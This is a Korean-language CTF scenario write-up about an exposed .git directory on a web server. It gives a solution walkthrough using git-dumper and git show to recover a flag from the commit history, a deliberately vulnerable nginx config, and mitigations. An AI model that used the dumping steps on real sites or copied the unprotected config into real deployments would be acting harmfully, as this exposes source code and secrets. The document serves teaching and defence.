---
title: Git Repository Exposure (.git) and Source Code Recovery — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, git-exposure, security-misconfiguration, source-recovery, git-dumper]
confidence: high
---

# Git Repository Exposure (.git) and Source Code Recovery — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Developer Portal Beta (개발자 포털 베타 사이트)
- **난이도**: Easy-Medium
- **핵심 컨셉**: 실 프로덕션 환경 배포 시 설정 부주의로 발생하는 **Git 리포지토리 노출(.git 폴더 노출)** 취약점 문제입니다. 개발자는 로컬에서 작성한 코드를 서버에 빠르게 동기화하기 위해 웹 루트 폴더에서 `git clone` 또는 `git init`을 수행한 뒤 배포를 완료했습니다. 이 과정에서 아파치/Nginx 방화벽 규칙에서 내부 특수 디렉터리인 `.git` 폴더에 대한 외부 접근 차단을 누락하였습니다. 공격자는 공개된 `.git` 파일들을 덤프 및 복원하여 전체 소스코드를 획득하고, 소스 내에 숨겨진 비밀 크레덴셜이나 과거 커밋 이력에 남겨져 방치된 플래그를 회수합니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **Frontend / Portal**: 베타 서비스 기능 안내용 일반 랜딩 웹 페이지.
- **Web Server (Nginx or Apache)**: 
  - 정적 파일 제공 기능.
  - 웹 루트 디렉터리: `/var/www/html/`
  - 배포 구조: `/var/www/html/.git/` 하위의 메타데이터 및 오브젝트가 모두 노출 상태.
- **Flag 위치**:
  - 복구된 소스코드 중 과거 커밋 이력 내의 주석 또는 삭제된 임시 파일 내에 하드코딩된 기밀 데이터.
  - 예: `git log -p` 명령어 추적을 통해 이전 커밋 로그 내역에서 발견.

### 2.2 취약점 지점
1. **Security Misconfiguration (Git Exposure)**:
   - 웹 서버의 디렉터리 접근 정책 세팅 부실로 인해, 외부 인터넷망에서 `.git/config`, `.git/index`, `.git/refs/heads/master` 등의 핵심 메타데이터 파일 요청 시 그대로 200 OK 응답과 함께 내용이 노출됩니다.
   - 공격자는 git 내부 개체(Object) 파일들을 해독하여 소스코드를 온전히 원복할 수 있게 됩니다.

---

## 3. 공격 면 (Attack Surface)

| 노출 경로 | 메소드 | 인증 | 입력 값 | 반환 값 | 비고 |
|-----------|--------|------|---------|---------|------|
| `/.git/index` | GET | 없음 | 없음 | 바이너리 인덱스 데이터 | 로드된 전체 파일 리스트 파싱용 |
| `/.git/objects/...` | GET | 없음 | 없음 | 해시 개체 바이너리 파일 | 파일 알맹이 덤프 및 복원용 |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. Git 디렉터리 활성화 여부 판별
웹 포털 도메인의 뒤쪽에 git 관련 파일을 수동 질의하여 응답 코드를 살펴봅니다.
- `/git/` 혹은 `/.git/config` 접속 시도
- *결과*:
  ```http
  HTTP/1.1 200 OK
  Content-Type: application/octet-stream
  
  [core]
      repositoryformatversion = 0
      filemode = true
      bare = false
      ...
  ```
  성공적으로 200 OK가 떨어지며 git 설정 파일이 노출됨을 확인합니다.

### Step 2. Git 덤프 도구를 이용한 전체 복원 수행
공격자는 직접 원격 파일들을 하나씩 덤프하기가 번거로우므로 `git-dumper` 등의 자동화 도구를 실행합니다.
- **익스플로잇 명령**:
  ```bash
  # git-dumper 도구를 이용해 노출된 .git 폴더 데이터를 로컬의 복구용 디렉터리(dist)로 다운로드합니다.
  git-dumper http://beta.challenge.local/.git/ ./dist
  ```
  도구는 `/.git/index`를 읽어 파일들의 명칭과 해시 매칭을 파악한 뒤, `/.git/objects/xx/xxxx...` 경로로 순차 리퀘스트를 날려 바이너리 개체를 회수하고 디코딩해 전체 소스코드 디렉터리를 복원해 냅니다.

### Step 3. 커밋 히스토리 추적
복구된 `dist` 디렉터리로 이동하여 현재 활성화된 코드뿐 아니라 과거 작성 히스토리 전체를 파악합니다.
- **Git 로그 분석**:
  ```bash
  cd ./dist
  git log -n 5 # 최근 5개 커밋 로그 조회
  ```
  *출력 결과 분석*:
  ```text
  commit c3a890dbfd89a...
  Author: dev <dev@challenge.local>
  Date:   2026-06-10
      Remove test flag from source code for deployment

  commit a1b2c3d4e5f6g...
  Author: dev <dev@challenge.local>
      Initialize beta dashboard code with db credentials
  ```
  "Remove test flag..." 이라는 커밋 메시지를 포착하고, 해당 커밋에서 무엇이 지워졌는지 diff를 비교합니다.

### Step 4. flag 획득
- **Git Diff 수행**:
  ```bash
  # 변경점 diff 상세 확인
  git show c3a890dbfd89a
  ```
- *출력 결과*:
  ```diff
  - $flag = "FLAG{git_repository_exposure_reveals_past_secrets}";
  + $flag = "REMOVED_FOR_PRODUCTION";
  ```
  삭제되기 직전 소스코드 내에 작성되어 있던 진짜 플래그(`FLAG{git_repository_exposure_reveals_past_secrets}`)를 복원하여 탈취합니다.

---

## 5. 취약점 유발 웹 서버 설정 스니펫 (Nginx 취약 예시)

```nginx
# /etc/nginx/sites-available/default
server {
    listen 80;
    server_name beta.challenge.local;
    root /var/www/html;
    index index.html;

    location / {
        try_files $uri $uri/ =404;
    }

    # 취약점 지점: 
    # 숨겨진 도트(.) 디렉터리에 대한 접근 차단 규칙이 설정되어 있지 않습니다.
    # Nginx가 파일 시스템의 /var/www/html/.git 폴더의 접근 요청을 수용하게 됩니다.
}
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **웹 서버 접근 제어 규칙 수립 (Block Hidden Directories)**:
   - 웹 서버 설정 파일에 도트(`.`)로 시작하는 모든 숨겨진 파일 및 폴더에 대한 외부 요청을 전역적으로 거부하는 규칙을 설정합니다.
   - **올바른 Nginx 차단 설정 예시**:
     ```nginx
     # .git, .env, .htaccess 등의 접근 시 404 또는 403을 리턴시킴
     location ~ /\. {
         deny all;
         access_log off;
         log_not_found off;
     }
     ```
2. **배포 방식 개선 (No Git in Web Root)**:
   - 웹 루트 경로에 직접 `.git`이 존재하는 방식으로 운영 배포를 하지 마십시오.
   - 로컬/CI 단계에서 빌드가 끝난 순수 실행 코드 아티팩트(바이너리, 정적 빌드 템플릿 등)만을 프로덕션 서버 폴더로 복사(rsync, deploy script)하는 빌드 파이프라인을 구축합니다.
3. **환경 변수 및 패스워드 제거 관리**:
   - 코드 저장소 내부에는 어떠한 하드코딩된 패스워드나 임시 테스트 플래그를 작성하지 말고, `env` 로더 모듈이나 외부 비밀 보관소(AWS Secrets Manager 등)를 통해 동적으로 설정값을 가져오도록 유지 관리합니다.
